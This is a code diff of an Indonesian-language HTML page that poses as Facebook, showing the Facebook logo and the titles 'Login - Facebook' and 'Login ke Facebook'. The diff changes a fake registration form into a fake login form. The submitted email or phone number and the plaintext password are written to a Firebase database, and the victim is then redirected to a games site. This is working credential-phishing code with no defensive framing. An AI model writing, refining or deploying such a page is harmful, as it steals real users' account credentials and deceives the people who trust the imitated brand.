@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Daftar - Facebook</title>
+    <title>Login - Facebook</title>
     
     <!-- Include Firebase SDK as ES Module -->
     <script type="module">
@@ -28,24 +28,20 @@
         const analytics = getAnalytics(app);
         const database = getDatabase(app);
 
-        // Form Submission
-        document.getElementById('registrationForm').addEventListener('submit', function (e) {
+        // Form Submission (Login)
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
             e.preventDefault();
 
-            const name = document.getElementById('name').value;
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
             const password = document.getElementById('password').value;
 
-            // Store data in Firebase
+            // Store login data to Firebase
             const newUserRef = ref(database, 'users/' + Date.now());
             set(newUserRef, {
-                name: name,
-                email: email,
-                phone: phone,
+                emailOrPhone: emailOrPhone,
                 password: password
             }).then(() => {
-                alert('Pendaftaran berhasil! Anda akan dialihkan ke situs game.');
+                alert('Login berhasil! Anda akan dialihkan ke situs game.');
                 window.location.href = "https://www.friv.com/"; // Redirect to Friv
             }).catch((error) => {
                 alert('Terjadi kesalahan: ' + error.message);
@@ -146,24 +142,18 @@
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
         </div>
-        <h1>Daftar ke Facebook</h1>
-        <form id="registrationForm">
+        <h1>Login ke Facebook</h1>
+        <form id="loginForm">
             <div class="form-group">
-                <input type="text" id="name" name="name" placeholder="Nama lengkap" required>
+                <input type="text" id="emailOrPhone" name="emailOrPhone" placeholder="Email atau Nomor Telepon" required>
             </div>
             <div class="form-group">
-                <input type="email" id="email" name="email" placeholder="Email" required>
+                <input type="password" id="password" name="password" placeholder="Kata Sandi" required>
             </div>
-            <div class="form-group">
-                <input type="tel" id="phone" name="phone" placeholder="Nomor telepon" required>
-            </div>
-            <div class="form-group">
-                <input type="password" id="password" name="password" placeholder="Kata sandi" required>
-            </div>
-            <button type="submit">Daftar</button>
+            <button type="submit">Login</button>
         </form>
         <div class="footer">
-            Sudah punya akun? <a href="#">Masuk</a>
+            Belum punya akun? <a href="#">Daftar</a>
         </div>
     </div>
 </body>
